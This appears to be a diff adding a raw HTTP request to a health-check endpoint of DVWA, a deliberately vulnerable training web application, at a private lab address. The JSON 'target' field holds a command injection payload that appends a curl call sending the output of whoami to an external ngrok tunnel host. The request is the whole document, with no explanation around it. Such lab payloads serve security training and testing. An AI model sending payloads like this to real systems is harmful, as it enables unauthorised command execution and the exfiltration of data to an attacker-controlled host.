@@ -1,0 +1,7 @@
+POST /DVWA/vulnerabilities/api/v2/health/connectivity HTTP/1.1
+Host: 192.168.56.105
+Content-Type: application/json
+Content-Length: 104
+{
+    "target":"127.0.0.1;curl https://multichanneled-alkalimetrically- rayford.ngrok-free.dev?cmd=$(whoami)"
+}
